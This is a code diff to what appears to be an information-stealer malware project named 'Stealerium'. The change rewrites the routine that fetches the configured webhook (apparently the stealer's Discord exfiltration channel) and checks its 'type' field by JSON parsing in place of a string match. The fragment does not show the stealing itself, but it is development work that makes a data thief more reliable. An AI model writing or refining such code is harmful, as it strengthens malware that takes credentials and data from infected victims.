@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net.Http;
+using System.Text.Json;
 using System.Threading.Tasks;
 using Newtonsoft.Json.Linq;
 using Stealerium.Helpers;
@@ -56,7 +57,14 @@ namespace Stealerium
                 using (var client = new HttpClient())
                 {
                     var response = await client.GetStringAsync(Config.Webhook).ConfigureAwait(false);
-                    return response.Contains("type\": 1");
+
+                    using (JsonDocument doc = JsonDocument.Parse(response))
+                    {
+                        if (doc.RootElement.TryGetProperty("type", out JsonElement typeElement))
+                        {
+                            return typeElement.GetInt32() == 1;
+                        }
+                    }
                 }
             }
             catch (Exception error)
